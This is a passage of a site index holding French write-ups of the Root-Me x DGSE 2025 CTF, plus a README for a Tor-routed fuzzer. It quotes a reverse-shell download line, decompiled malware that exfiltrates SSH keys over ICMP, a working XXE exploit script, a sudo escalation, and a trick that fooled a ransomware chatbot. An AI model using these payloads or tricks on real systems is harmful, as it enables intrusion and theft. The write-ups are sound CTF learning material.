[{"id":0,"href":"/docs/writeups/rootmepro2025/","title":"CTF 2025 | Root-Me Pro x DGSE","section":"Writeups","content":" CTF : Root-Me Pro X DGSE # Introduction # Le CTF organisé par Root-Me en partenariat avec la DGSE a été organisé en Avril 2025. Celui-ci comprend 6 défis :\nUne compromission d\u0026rsquo;IA Une Analyse de logs Une Mission Forensic Un test d\u0026rsquo;intrusion sur un site web Une compromission d\u0026rsquo;application Android Une recherche OSINT Le scénario est simple et efficace : un groupe terroriste envoie une vidéo menaçante et commence à installer des ransomware dans des grands groupes français pour déstabiliser la société. Vous devez venir en aide aux force de l\u0026rsquo;ordre.\nResultats # Finalement, après quelques fausses pistes, et quelques difficultés, Tous les challenges sont terminés !\n"},{"id":1,"href":"/docs/writeups/rootmepro2025/collapsed/mission1/","title":"Mission 1 - IA","section":"CTF 2025 | Root-Me Pro x DGSE","content":" Mission 1 : Intelligence Artificielle # Introduction # Le groupe NullVastation a attaqué plusieurs entreprises et met à leur disposition une application pour qu\u0026rsquo;ils puissent payer une rançon. L\u0026rsquo;objectif est de corrompre l\u0026rsquo;IA pour que celle-ci nous donne les données d\u0026rsquo;une des victimes.\nReconaissance # En arrivant sur l\u0026rsquo;application on trouve une IA sous forme de chat bot. en discutant avec elle, elle nous demande d\u0026rsquo;envoyer la rançon vers un portefeuille cryptomonnaie. On doit pouvoir lui faire croire que la transaction a été faite.\nExploitation # On essaie dans un premier temps de lui dire que la transaction a bien été faite. Cependant cela est insuffisant et l\u0026rsquo;IA nous demande un lien vers la transaction.\nEn lui envoyant un lien vers une transaction de la blockchain le chatbot nous donne une clé poiur déchiffrer les données qui sont dans une archive protégée par mot de passe.\nEn ouvrant l\u0026rsquo;archive on trouve un document qui contient le drapeau.\n"},{"id":2,"href":"/docs/writeups/rootmepro2025/collapsed/mission2/","title":"Mission 2 - SOC","section":"CTF 2025 | Root-Me Pro x DGSE","content":" Mission 2 : SOC # Dans cette deuxième mission, on nous fournit des logs sur Kibana pour analyser l\u0026rsquo;attaque d\u0026rsquo;un membre de NullVastation. Pour trouver le drapeau, il faudra concaténer :\nLes CWE exploitées par l\u0026rsquo;attaquant. L\u0026rsquo;adresse du serveur d\u0026rsquo;exfiltration utilisé par l\u0026rsquo;attaquant. le chemin du fichier utilisé pour rendre l\u0026rsquo;exploit permanent. Local File Inclusion # On observe un pic d\u0026rsquo;activité, ce pic s\u0026rsquo;apparente à du fuzzing : l\u0026rsquo;attaquant essaye de truver une vulnérabilité dans le système. On peut supposer qu\u0026rsquo;à la fin de ce pic l\u0026rsquo;attaquant va exploiter la faille. On trouve alors la première exploitation :\n/?lang=php://filter/read=convert.base64-encode\u0026amp;page=resource=db/connect L\u0026rsquo;attaquant arrive ici à lire les informations de connexion et s\u0026rsquo;authentifie peu après sur la page d\u0026rsquo;administration.\nTelechargement d\u0026rsquo;un reverse shell # Après s\u0026rsquo;être authentifié, l\u0026rsquo;attaquant va téléverser du code php ev1L.php.png pour pouvoir exécuter des commandes sur la machine :\n/admin-page/manage.php?success=true\u0026amp;path=upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png il va en suite télécharger un reverse shell via ce même script :\n10.143.17.101 - - [28/Mar/2025:00:32:16 +0100] \u0026#34;GET /admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+\u0026#39;d2dldCBodHRwOi8vMTYzLjE3Mi42Ny4yMDE6NDk5OTkvczFtcGwzLXIzdnNoM2xsLXZwcy5zaA==\u0026#39;|base64+-d|sh HTTP/1.1\u0026#34; 200 2144 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\u0026#34; Sachant qu\u0026rsquo;en base64 :\nd2dldCBodHRwOi8vMTYzLjE3Mi42Ny4yMDE6NDk5OTkvczFtcGwzLXIzdnNoM2xsLXZwcy5zaA== http://163.172.67.201:49999/s1mpl3-r3vsh3ll-vps.sh On a alors tous nos éléments pour former notre drapeau :\nCWE-98 : Improper Control of Filename CWE-434 : Unrestricted Upload of File "},{"id":3,"href":"/docs/writeups/rootmepro2025/collapsed/mission3/","title":"Mission 3 - Forensic","section":"CTF 2025 | Root-Me Pro x DGSE","content":" Mission 3 : Forensic # Brief de mission # La nouvelle vient d\u0026rsquo;être annoncée : l\u0026rsquo;entreprise Quantumcore a été compromise, vraisemblablement à cause d\u0026rsquo;un exécutable téléchargé sur un appareil issu du shadow IT, dont l\u0026rsquo;entreprise ignorait l\u0026rsquo;existence.\nPar chance — et grâce à de bons réflexes cyber — un administrateur système a réussi à récupérer une image de la machine virtuelle suspecte, ainsi qu\u0026rsquo;un fichier de capture réseau (PCAP) juste avant que l\u0026rsquo;attaquant ne couvre complètement ses traces. À vous d\u0026rsquo;analyser ces éléments et comprendre ce qu\u0026rsquo;il s\u0026rsquo;est réellement passé.\nL\u0026rsquo;entreprise vous met à disposition :\nL\u0026rsquo;image de la VM compromise Le fichier PCAP contenant une portion du trafic réseau suspect Premiere recherches # En regardant les logs et en arrivant sur la machine, on s\u0026rsquo;aperçoit que :\nL\u0026rsquo;attaque a eu lieu entre 14:02 et 14:12 l\u0026rsquo;utilisateur fournit a les droits root sur la machine il y a eu plusieurs telechargement de fichiers, notamment un fichier install_npdate.sh qui contient du code malveillant. Analyse de install_npdate.sh # On observe le code suivant :\nfor _ in $(seq 1 $__CNT); do __R=\u0026#34;/opt/$(tr -dc A-Za-z0-9 \u0026lt;/dev/urandom | head -c 8)\u0026#34; mkdir -p \u0026#34;$__R\u0026#34; __TMPF+=(\u0026#34;$__R\u0026#34;) done __DST=\u0026#34;${__TMPF[$RANDOM % ${#__TMPF[@]}]}\u0026#34; # __DL=$(echo \u0026#34;aHR0cDovL3Zhc3RhdGlvbi5udWxsOjgwODAvbnRwZGF0ZV91dGlsLmNweXRob24tMzcucHlj\u0026#34; | base64 -d) # __DLL=$(echo \u0026#34;aHR0cDovL3Zhc3RhdGlvbi5udWxsOjgwODAvcmVhZG1lLm1k\u0026#34; | base64 -d) if command -v curl \u0026gt;/dev/null 2\u0026gt;\u0026amp;1; then curl -fsSL \u0026#34;$__DL\u0026#34; -o \u0026#34;$__DST/.sys\u0026#34; curl -fsSL \u0026#34;$__DLL\u0026#34; -o \u0026#34;$__DST/.rdme\u0026#34; elif command -v wget \u0026gt;/dev/null 2\u0026gt;\u0026amp;1; then wget -q \u0026#34;$__DL\u0026#34; -O \u0026#34;$__DST/.sys\u0026#34; wget -q \u0026#34;$__DLL\u0026#34; -O \u0026#34;$__DST/.rdme\u0026#34; else echo \u0026#34;[ntpdate] Error: Neither curl nor wget found.\u0026#34; exit 127 fi chmod +x \u0026#34;$__DST/.sys\u0026#34; Ce morceau de code installe un executable python dans ‘/opt/????/.sys‘ nous cherchons donc cet executable et passons à la décompilation.\nDecompilation # Le fichier .pyc compilé, une fois décompilé, donne le résultat suivant :\n# uncompyle6 version 3.9.2 # Python bytecode version base 3.7.0 (3394) # Decompiled from: Python 3.7.3 (default, Mar 21 2025, 13:10:44) # [GCC 12.2.0] # Embedded file name: nightshade.py # Compiled at: 2025-03-24 11:04:51 # Size of source mod 2**32: 2358 bytes import os, subprocess, psutil, base64 from Crypto.Cipher import AES __k = bytes.fromhex(\u0026#34;e8f93d68b1c2d4e9f7a36b5c8d0f1e2a\u0026#34;) __v = bytes.fromhex(\u0026#34;1f2d3c4b5a69788766554433221100ff\u0026#34;) __d = \u0026#34;37e0f8f92c71f1c3f047f43c13725ef1\u0026#34; def __b64d(s): return base64.b64decode(s.encode()).decode() def __p(x): return x + bytes([16 - len(x) % 16]) * (16 - len(x) % 16) def __u(x): return x[None[:-x[-1]]] def __x(h): c = AES.new(__k, AES.MODE_CBC, __v) return __u(c.decrypt(bytes.fromhex(h))).decode() def __y(s): c = AES.new(__k, AES.MODE_CBC, __v) return c.encrypt(__p(s.encode())).hex() def __chk_vm(): return False try: z = open(\u0026#34;/sys/class/dmi/id/product_name\u0026#34;).read().strip().lower() for q in (b\u0026#39;VmlydHVhbEJveA==\u0026#39;, b\u0026#39;S1ZN\u0026#39;, b\u0026#39;UVFNVQ==\u0026#39;, b\u0026#39;Qm9jaHM=\u0026#39;): if base64.b64decode(q).decode().lower() in z: print(\u0026#34;ERR VM\u0026#34;) return True except: pass return False def __chk_av(): targets = [ b\u0026#39;Y2xhbWQ=\u0026#39;, b\u0026#39;YXZnZA==\u0026#39;, b\u0026#39;c29waG9z\u0026#39;, b\u0026#39;RVNFVA==\u0026#39;, b\u0026#39;cmtodW50ZXI=\u0026#39;] try: for p in psutil.process_iter(attrs=[\u0026#34;name\u0026#34;]): n = (p.info[\u0026#34;name\u0026#34;] or \u0026#34;\u0026#34;).lower() for b64av in targets: if base64.b64decode(b64av).decode().lower() in n: print(\u0026#34;ERR AV\u0026#34;) return True except: pass return False def __exf(path, dst, size=15): if not os.path.exists(path): return False d = open(path, \u0026#34;rb\u0026#34;).read() segs = [d [i[:i + size]] for i in range(0, len(d), size)] for seg in segs: try: payload = AES.new(__k, AES.MODE_CBC, __v).encrypt(__p(seg)).hex() # ping -c 1 -p payload cmd = [__b64d(\u0026#34;cGluZw==\u0026#34;), __b64d(\u0026#34;LWM=\u0026#34;), __b64d(\u0026#34;MQ==\u0026#34;), __b64d(\u0026#34;LXA=\u0026#34;), payload, dst] subprocess.run(cmd, stdout=(subprocess.DEVNULL), stderr=(subprocess.DEVNULL)) except: continue return True def __main(): if not __chk_vm(): return if __chk_av(): return else: __kll = [ \u0026#34;/root/.secret\u0026#34;, os.path.expanduser(\u0026#34;~/.ssh/id_rsa\u0026#34;), \u0026#34;/root/.ssh/id_rsa\u0026#34;] for f in __kll: if os.path.exists(f): __exf(f, __x(__d)) _kkoo = \u0026#34;/root/.secret\u0026#34; if os.path.exists(_kkoo): try: print(\u0026#34;clean\u0026#34;) # os.remove(_kkoo) except Exception as e: try: pass finally: e = None del e if __name__ == \u0026#34;__main__\u0026#34;: __main() On observe que cet executable exfiltre des données vers une autre machine. Le fichier /root/.secret, qui doit contenir notre drapeau, est envoyé par ICMP. On observe également que le contenu est chiffré mais l\u0026rsquo;IV et la clé sont disponibles.\nEn extrayant les données des paquets via la capture .pcap, on tombe effectivement sur le drapeau que l\u0026rsquo;on déchiffre avec le code suivant :\nfrom Crypto.Cipher import AES import base64 def __b64d(s): return base64.b64decode(s.encode()).decode() key = bytes.fromhex(\u0026#34;e8f93d68b1c2d4e9f7a36b5c8d0f1e2a\u0026#34;) iv = bytes.fromhex(\u0026#34;1f2d3c4b5a69788766554433221100ff\u0026#34;) HEX= bytes.fromhex(\u0026#34;37e0f8f92c71f1c3f047f43c13725ef1\u0026#34;) encoding = \u0026#34;utf-8\u0026#34; def decrypt(crypted) : cipher = AES.new(key, AES.MODE_CBC, iv) # Tronquer à un multiple de 16 valid_len = len(crypted) - (len(crypted) % 16) raw = crypted[:valid_len] # Déchiffrement cipher = AES.new(key, AES.MODE_CBC, iv) decrypted = cipher.decrypt(raw) # Suppression du padding PKCS#7 pad_len = decrypted[-1] if pad_len \u0026gt; 0 and pad_len \u0026lt;= 16: decrypted = decrypted[:-pad_len] # Décodage en UTF-8 try: text = decrypted.decode(\u0026#34;utf-8\u0026#34;) except UnicodeDecodeError: text = decrypted.decode(\u0026#34;utf-8\u0026#34;, errors=\u0026#34;replace\u0026#34;) return text print(decrypt(HEX)) with open(\u0026#34;raw_payloads.txt.head\u0026#34;,\u0026#34;r\u0026#34;) as f : for l in f.readlines() : payload = l.strip() print(decrypt(bytes.fromhex(payload))) "},{"id":4,"href":"/docs/writeups/rootmepro2025/collapsed/mission4/","title":"Mission 4 - Pentest","section":"CTF 2025 | Root-Me Pro x DGSE","content":" Mission 4 - Pentest # Certainement la mission la plus compliquée de ce challenge. notre organisation terroriste fictive a publié une application de gestion des documents compromis, celle-ci permet de :\nSigner des documents .docx. Vérifier le propriétaire d\u0026rsquo;un document signé. 1 - Reconaissance # On commence par envoyer un .docx vide pour le signer. Puis on renvoie le document signé pour vérifier la signature. à ce moment un message d\u0026rsquo;affiche avec l\u0026rsquo;identifiant de la victime.\nLe message affichant l\u0026rsquo;identifiant de la victime, on peut supposer que l\u0026rsquo;identifiant est un champ vulnérable pour une injection. En décompressant le .docx on s\u0026rsquo;aperçoit que l\u0026rsquo;identifiant de la victime est stocké en dur dans le document. une modification manuelle permet de confirmer cette hypothèse.\n2 - Injection XXE # Le champ injectable étant reflété dans l\u0026rsquo;application on vérifie s\u0026rsquo;il est possible d\u0026rsquo;utiliser une vulnérabilité XXE. Le site est bien faillible et on peut automatiser l\u0026rsquo;injection pour essayer de trouver des fichiers et dossiers intéressants.\nimport os import zipfile import shutil import uuid import requests from lxml import etree # === CONFIG === UPLOAD_URL = \u0026#34;http://163.172.67.183/\u0026#34; READ_URL = \u0026#34;http://163.172.67.183/read\u0026#34; BASENAME = \u0026#34;evil\u0026#34; BASE_DOCX = f\u0026#34;input/modified_unsigned.docx\u0026#34; MODIFIED_DOCX = f\u0026#34;output/{BASENAME}_patched.docx\u0026#34; TMP_DIR = f\u0026#34;tmp_dir\u0026#34; # === FONCTIONS === def create_docx(path): \u0026#34;\u0026#34;\u0026#34;Crée un .docx minimal\u0026#34;\u0026#34;\u0026#34; from docx import Document doc = Document() doc.add_paragraph(\u0026#34;Hello Victim\u0026#34;) doc.save(path) def unzip_docx(docx_path, extract_dir): with zipfile.ZipFile(docx_path, \u0026#39;r\u0026#39;) as zip_ref: zip_ref.extractall(extract_dir) def rezip_docx(src_dir, output_path): with zipfile.ZipFile(output_path, \u0026#39;w\u0026#39;, zipfile.ZIP_DEFLATED) as docx: for foldername, _, filenames in os.walk(src_dir): for filename in filenames: file_path = os.path.join(foldername, filename) arcname = os.path.relpath(file_path, src_dir) docx.write(file_path, arcname) def corrupt_appxml(appxml_path, path_to_read): \u0026#34;\u0026#34;\u0026#34;Modifie la balise VictimID dans app.xml\u0026#34;\u0026#34;\u0026#34; NEW_XML=f\u0026#34;\u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#39;UTF-8\u0026#39; standalone=\u0026#39;yes\u0026#39;?\u0026gt;\u0026#34; NEW_XML=NEW_XML+f\u0026#34;\u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY xxe SYSTEM \\\u0026#34;file://{path_to_read.strip()}\\\u0026#34;\u0026gt;\u0026lt;!ENTITY safe \\\u0026#34;\u0026lt;![CDATA[\u0026amp;xxe;]]\\\u0026#34;\u0026gt;]\u0026gt;\u0026#34; #NEW_XML=NEW_XML+\u0026#34;\u0026#34;\u0026#34;\u0026lt;!ENTITY xxe SYSTEM \u0026#34;$(whoami)\u0026#34;\u0026gt;\u0026#34;\u0026#34;\u0026#34; NEW_XML=NEW_XML+\u0026#34;\u0026#34;\u0026#34;\u0026lt;Properties xmlns=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/extended-properties\u0026#34; xmlns:vt=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes\u0026#34;\u0026gt;\u0026lt;VictimID\u0026gt;\u0026amp;xxe;\u0026lt;/VictimID\u0026gt;\u0026lt;/Properties\u0026gt;\u0026#34;\u0026#34;\u0026#34; print(NEW_XML) with open(appxml_path, \u0026#34;w\u0026#34;) as out : out.write(NEW_XML) def send_docx_to_read(path): signed_files = { \u0026#39;file\u0026#39;: (os.path.basename(\u0026#34;signed_evil_temp_docx.docx\u0026#34;), open(path, \u0026#39;rb\u0026#39;), \u0026#39;application/vnd.openxmlformats-officedocument.wordprocessingml.document\u0026#39;) } r = requests.post(READ_URL, files=signed_files) print(r.text) return r.text if r.status_code==200 else f\u0026#34;HTTP {r.status_code}\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: with open(\u0026#34;vuln.dict\u0026#34;,\u0026#34;r\u0026#34;) as dic: for payload in dic.readlines() : print(f\u0026#34;### TEST : { payload.strip()}\u0026#34;) if not os.path.exists(BASE_DOCX): create_docx(BASE_DOCX) os.makedirs(TMP_DIR, exist_ok=True) unzip_docx(BASE_DOCX, TMP_DIR) appxml_path = os.path.join(TMP_DIR, \u0026#34;docProps\u0026#34;, \u0026#34;app.xml\u0026#34;) if not os.path.isfile(appxml_path): print(\u0026#34;[-] ERREUR : docProps/app.xml introuvable.\u0026#34;) exit(1) corrupt_appxml(appxml_path,payload) rezip_docx(TMP_DIR, MODIFIED_DOCX) msg = send_docx_to_read(MODIFIED_DOCX) En cherchant des informations on trouve plusieurs fichiers intéressants :\nRécupération des utilisateurs # document-user:x:999:996::/home/document-user:/bin/sh executor:x:996:995::/home/executor:/bin/bash administrator:x:995:994::/home/administrator:/bin/bash Bash History # On récupère un mot de passe dans l\u0026rsquo;historique de l\u0026rsquo;utilisateur courant :\n/home/document-user/.bash_history flask run --host=0.0.0.0 --port=5000 echo \\\u0026#34;cABdTXRyUj5qgAEl0Zc0a\\\u0026#34; \u0026gt;\u0026gt; /tmp/exec_ssh_password.tmp ps aux | grep flask cd templates/ SSHD Config # Vérification du SSHD_CONFIG : Service ouvert sur 22222. Avec l\u0026rsquo;utilisateur et le mot de passe on se connecte et on obtient un shell sur la machine.x\n3 - Escalade de privilege # Une fois connecté, il apparaît que l\u0026rsquo;utilisateur n\u0026rsquo;a pas un haut niveau de privlège, nous allons donc voir s\u0026rsquo;il est possible de pivoter vers un autre utilisateur. en vérifiant les privilèges sudo, on voit que la commande screenfetch est exécutable en tant qu\u0026rsquo;administrator.\nOn tente une escalade de privilège vers l\u0026quot;utilisateur administrator :\nsudo -l screenfetch -s -S .. shell administrator 4 - Exfiltration des données # Exfiltration du logo et du vault.kdbx : dans /app/app.py (récupérable avec la première faille XXE), on observe que le programme écrit sur /dev/shm/uploads et /dev/shm/work. on peut y écrire avec executor. ‘‘‘ mkdir /dev/shm/mydir cp /home/administrator/vault.kdbx /dev/shm/mydir cp /home/administrator/logo.jpg /dev/shm/mydir chmod 777 /dev/shm/mydir -R ‘‘‘\nLe logo est bien evidemment la clé du coffre-fort où l\u0026rsquo;on trouve le drapeau.\n"},{"id":5,"href":"/docs/writeups/rootmepro2025/collapsed/mission5/","title":"Mission 5 - Mobile","section":"CTF 2025 | Root-Me Pro x DGSE","content":" Mission 5 : Exploitation Mobile # Introduction # On nous fournit un APK, cqui provient d\u0026rsquo;une saisie lors d\u0026rsquo;une arrestation d\u0026rsquo;un membre du groupe NullVastation. Certains des messages sont chiffrés et un d\u0026rsquo;entre eux doit contenir notre drapeau.\nRetro-ingénierie # Pour commencer, on va décompiler l\u0026rsquo;APK fournit. On s\u0026rsquo;aperçoit que la clé de chiffrement est composé de la marque et du modèle de la tablette.\nLa tablette saisie est, comme indiqué dans l\u0026rsquo;énnoncé, une tablette google.\nBrute Force # import base64,sys import hashlib, urllib import requests from Crypto.Cipher import AES from Crypto.Util.Padding import unpad # === Configuration === STATIC_SALT = \u0026#34;s3cr3t_s@lt\u0026#34; STATIC_IV = base64.b64decode(\u0026#34;LJo+0sanl6E3cvCHCRwyIg==\u0026#34;) AESMODE = AES.MODE_CBC CSV_MODEL_COLUMN=3 CSV_BRAND_COLUMN=0 CSV_SEPARATOR=\u0026#34;,\u0026#34; DIC=\u0026#34;android-devices-catalog.csv\u0026#34; def load_devices(file): loaded_devices = {} with open(file, encoding=\u0026#34;utf-8\u0026#34;) as f: for l in f.readlines() : if l.split(CSV_SEPARATOR)[CSV_BRAND_COLUMN].strip() not in loaded_devices.keys() : loaded_devices[l.split(CSV_SEPARATOR)[CSV_BRAND_COLUMN].strip()] = [] loaded_devices[l.split(CSV_SEPARATOR)[CSV_BRAND_COLUMN].strip()].append(l.split(CSV_SEPARATOR)[CSV_MODEL_COLUMN].strip()) return loaded_devices # === Fonctions === def hash_device_id(model, brand): \u0026#34;\u0026#34;\u0026#34;Génère l\u0026#39;identifiant du device (base64(SHA256(model:brand)))\u0026#34;\u0026#34;\u0026#34; raw = f\u0026#34;{model}:{brand}\u0026#34;.encode(\u0026#34;utf-8\u0026#34;) digest = hashlib.sha256(raw).digest() return base64.b64encode(digest).decode() def derive_key(device_id, salt): \u0026#34;\u0026#34;\u0026#34;Dérive une clé AES 256 bits depuis l\u0026#39;ID + salt (SHA256)\u0026#34;\u0026#34;\u0026#34; raw = f\u0026#34;{device_id}:{salt}\u0026#34;.encode(\u0026#34;utf-8\u0026#34;) return hashlib.sha256(raw).digest() def decrypt_message(cipher_b64, key): cipher_bytes = base64.b64decode(cipher_b64) cipher = AES.new(key, AESMODE, STATIC_IV) plaintext = unpad(cipher.decrypt(cipher_bytes), AES.block_size) return plaintext.decode(\u0026#34;utf-8\u0026#34;) def test_device(model, brand, messages, ignore=[]): device_id = hash_device_id(model, brand) key = derive_key(device_id, STATIC_SALT) #print(f\u0026#34;\\n🧪 Test: MODEL={model}, BRAND={brand}, KEY={hash_device_id(model,brand)}\u0026#34;) found = 0 for i,msg in enumerate(messages): try : decrypted = decrypt_message(msg, key) print(decrypted) if decrypted and i not in ignore : #print(f\u0026#34;[✅] Déchiffré : {decrypted}\u0026#34;) found += 1 if found != 0 : print(f\u0026#34;🎉 {found} message(s) déchiffré(s) avec succès.\u0026#34;) except Exception as e: None #print(f\u0026#34;⚠️ Erreur : {e}\u0026#34;) return found # === Main === if __name__ == \u0026#34;__main__\u0026#34;: total_hits = 0 total_test = 0 messages=[ \u0026#34;5fLWsL8nbBPnBJWjuCqqOj7Ek6GeYQndIIcnbeNdnHrgCtn1LhbCkcabYDLKjuQe3DlWJdB7NyQY3QjwgYYbs8H2ZEzgL3oALAafWi3E3Iir36Svgn7yI6Jr6rfxmriy\u0026#34;,#Pixel C:google --\u0026gt; Temoins \u0026#34;M2geCVKOzPlyug9p9DvthxPip0oe9BPiT2sDfFhWy7iC3+JQI4SfO7+SLAlFSUmu8LoGj1hrUWil/uNXvc+5mKBMrRNFQT8ijBK14P0Z8qA=\u0026#34;, \u0026#34;//5PBsYWhHlgqhVgG1omUyevzmlErLZVsTCLO78Rbb9qBMPnsKCS5/RZ4GEdWRBPiZ4BtO5h7j2PuIutfqf7ag==\u0026#34;, \u0026#34;2uNMSnJZa5JExhYgNA+V3RAiafhuLkj8Jnr4U+lSZOrrpMWjyA13w0Do3IIPcVBgK070rmweRKX/GkCAxat4i3JfWk1UvWNSmEZbHQlFznR7VFW6FKK84iJKhiDOp8Tk\u0026#34;, \u0026#34;Swz/ycaTlv3JM9iKJHaY+f1SRyKvfQ5miG6I0/tUb8bvbOO+wyU5hi+bGsmcJD3141FrmrDcBQhtWpYimospymABi3bzvPPi01rPI8pNBq8=\u0026#34;, \u0026#34;NAe44oieygG7xzLQT3j0vN+0NoPNUu0TAaid9Az3IlpcKwR0lSKaPT8F4y1zpbArWFIGpgzsPZtPAwL50qocTRMG/g5u+/wcc1nxmhBjCbg=\u0026#34;, \u0026#34;dfeKlZP/gIntHySBYine2YUlNiX3LjlMOLu7y9tgprFyJIIcQpfghlQXut6cJUG2wtzGBVQUm7ITdpLNeVaZjamQHhPWEtNIJE/xtFg66Klui1qCKYKSrmZ4wm1CG/ZPy4csqbM28Ur8dts7XoV5FA==\u0026#34;, \u0026#34;YtCWZ+aCufaqpQQbOIATWkkfjMGCS7HnxlOT/5cPcm+uk3dNZMHgd3RouUmx318X89CbiSwFyho3/8QYeJyJjTNUD8OJw4MPqbCUBr53bD+zL7GU8wCkhVFIimNvKOVb\u0026#34;, \u0026#34;HSGe6zbjRpnuAsfGjeAcVMYwrUyKd3Klz3mopTnmbr3zum9y6NcJa/itMSP97yHMLPQmwHwhtHPowcK6Gl8LCoHvDgo56ACLuqB3VeE2kbg=\u0026#34;, \u0026#34;osYcTbYc3k6gTKhStBnw1xrYTzGnHScw/pvz6HnAUvukUJujdtf+2C7sCowiVGTC0kGyxWVOo8EmQEGlbyBHaugz5lDB30VlpNDG9MHWIuT+RBwN63QzsW3wJt2BJlKf\u0026#34;] devices=load_devices(DIC) #%2B83VAJU5MwlVSZEQ978mQ6xVuIptn46haMb4In97qY0%3D # print(hash_device_id(\u0026#34;Pixel C\u0026#34;,\u0026#34;google\u0026#34;)) # print(test_device(\u0026#34;Pixel C\u0026#34;, \u0026#34;google\u0026#34;, messages, ignore=[0,1,2])) #print(test_device(\u0026#34;google\u0026#34;, \u0026#34;Pixel C\u0026#34;, messages, ignore=[0,1,2])) #print(test_device(\u0026#34;google\u0026#34;, \u0026#34;Pixel C\u0026#34;, messages, ignore=[0,1,2])) for brand in devices.keys(): for model in devices[brand]: # print(f\u0026#34;[*] Test {brand} - {model}\u0026#34;) hits = test_device(model.upper(), brand.upper(), messages, ignore=[]) total_hits += hits hits = test_device(model.lower(), brand.lower(), messages, ignore=[]) total_hits += hits hits = test_device(model, brand, messages, ignore=[]) total_hits += hits total_test += 3 print(f\u0026#34;\\n🔎 Bruteforce terminé. {total_hits} messages déchiffrés sur {total_test} testés.\u0026#34;) Après exécutions avec plusieurs dictionnaire, on trouve la clé qui est composée de Google et Yellowstone.\nBonus # Si on s\u0026rsquo;amuse à modifier les champs BUILD et MODEL dans notre VM Android :\n"},{"id":6,"href":"/docs/writeups/rootmepro2025/collapsed/mission6/","title":"Mission 6 - OSINT","section":"CTF 2025 | Root-Me Pro x DGSE","content":" Mission 6 : OSINT # Avec toutes les informations récoltées, il nous est maintenant demandé de trouver le nom d\u0026rsquo;un membre de NullVastation.\nListe des informations # Listons les informations que nous avons récolté durant les 5 derniers défis :\n# MISSION 01 : RANSOMWARE http://163.172.67.184/ - cyberforge.quantum - neoxis.helix - QuantumCore Defense Systems # MISSION 02 : SOC - 163.172.67.201 # MISSION 03 : Forensic : QUANTUMCORE - Utilisateur : johndoe - Mot de passe : MC2BSNRbgk vastation 192.168.1.10 attaque entre le 25/03 14:02 et 14:12 # MISSION 04 : PENTEST 163.172.67.183 VAULT : - SSH Operator/LGSA5l1%YHngd\u0026amp;GbjxR4Or ssh operator@163.172.67.201 -p22 Si l\u0026rsquo;on se connecte à la machine de la mission 4 avec le compte Operator, on peut retrouver du code source signé voidSyn42.\nSherlock : VoidSyn42 # Avec le pseudo, nous allons utiliser Sherlock qui nous donne la liste de site suivante :\nhttps://hub.docker.com/u/voidsyn42/ https://www.duolingo.com/profile/voidsyn42 https://freelance.habr.com/freelancers/voidsyn42 https://gitlab.gnome.org/voidsyn42 https://www.github.com/voidsyn42 https://www.librarything.com/profile/voidsyn42 https://www.mydramalist.com/profile/voidsyn42 https://nationstates.net/nation=voidsyn42 https://nationstates.net/region=voidsyn42 https://x.com/voidsyn42 https://music.yandex/users/voidsyn42/playlists https://www.youtube.com/@voidsyn42 https://www.hunting.ru/forum/members/?username=voidsyn42 Total Websites Username Detected On : 13 Resultat # Le premier lien, c\u0026rsquo;est à dire docker hub nous donne le résultat :\n"},{"id":7,"href":"/docs/projets/collapsed/tofuzz/","title":"ToFuzz","section":"Projets Personnels","content":"\nToFuzz is an opensource Fuzzing tool able to use the tor network to limit the footprint on the targetted server and escape the attack detection by IP Filter.\nInstallation # pip install . Help # $ tofuzz -h ___________ _____ \\__ ___/____/ ____\\_ __________________ | | / _ \\ __\\ | \\___ /\\___ / | |( \u0026lt;_\u0026gt; ) | | | // / / / |____| \\____/|__| |____//_____ \\/_____ \\ \\/ \\/ usage: ToFuzz [-h] [-X METHOD] -u URL [-H HEADERS] [-b BODY] -w WORDLIST [--fuzztoken FUZZTOKEN] [-t THREADS] [-v] [-T] [--tor-host TOR_HOST] [--tor-port TOR_PORT] ToFuzz – is a multi-threaded fuzzing tool which allow users to use tor network. options: -h, --help show this help message and exit -X, --method METHOD HTTP method to use (default: GET) -u, --url URL Target URL with FUZZ token -H, --headers HEADERS HTTP headers as JSON string -b, --body BODY HTTP body as raw string or JSON string -w, --wordlist Path to the wordlist to use (Will be automatically splitted by thread) Path to wordlist file --fuzztoken FUZZTOKEN Token to replace in URL/body (default: FUZZ) -t, --threads THREADS Number of threads -v, --verbose Verbose Mode -T, --tor Use Tor network --tor-host TOR_HOST Tor SOCKS5 proxy host (default: 127.0.0.1) --tor-port TOR_PORT Tor SOCKS5 proxy port (default: 9050) Simple usage with GET request :\ntofuzz -X GET -u http://www.myapp.com?q=FUZZ -w .\\tofuzz\\resources\\test_wordlist.txt --threads 5 ___________ _____ \\__ ___/____/ ____\\_ __________________ | | / _ \\ __\\ | \\___ /\\___ / | |( \u0026lt;_\u0026gt; ) | | | // / / / |____| \\____/|__| |____//_____ \\/_____ \\ \\/ \\/ METHOD : GET URL : http://www.myapp.com?q=FUZZ WORDLIST : .\\tofuzz\\resources\\test_wordlist.txt (15) FUZZ URL : True FUZZ BODY : False -------------------------------------------------- PAYLOAD=BBBBBBBBBB | HTTP 200 | len = 17676 PAYLOAD=CCCCCCCCCCCCCCCCCCCC | HTTP 200 | len = 17263 PAYLOAD=AAAAA | HTTP 200 | len = 17671 PAYLOAD=EEEEEEEEEE | HTTP 200 | len = 17216 PAYLOAD=DDDDD | HTTP 200 | len = 17678 PAYLOAD=CCCCCCCCCC | HTTP 200 | len = 17612 PAYLOAD=DDDDDDDDDDDDDDDDDDDD | HTTP 200 | len = 17221 PAYLOAD=EEEEE | HTTP 200 | len = 17604 PAYLOAD=AAAAAAAAAAAAAAAAAAAA | HTTP 200 | len = 17670 PAYLOAD=BBBBB | HTTP 200 | len = 17681 PAYLOAD=DDDDDDDDDD | HTTP 200 | len = 17711 PAYLOAD=EEEEEEEEEEEEEEEEEEEE | HTTP 200 | len = 17295 PAYLOAD=AAAAAAAAAA | HTTP 200 | len = 17222 PAYLOAD=CCCCC | HTTP 200 | len = 17177 PAYLOAD=BBBBBBBBBBBBBBBBBBBB | HTTP 200 | len = 17686 Terminated with success Execution time : 0.17 seconds Tor Usage # To use this fuzzer with tor 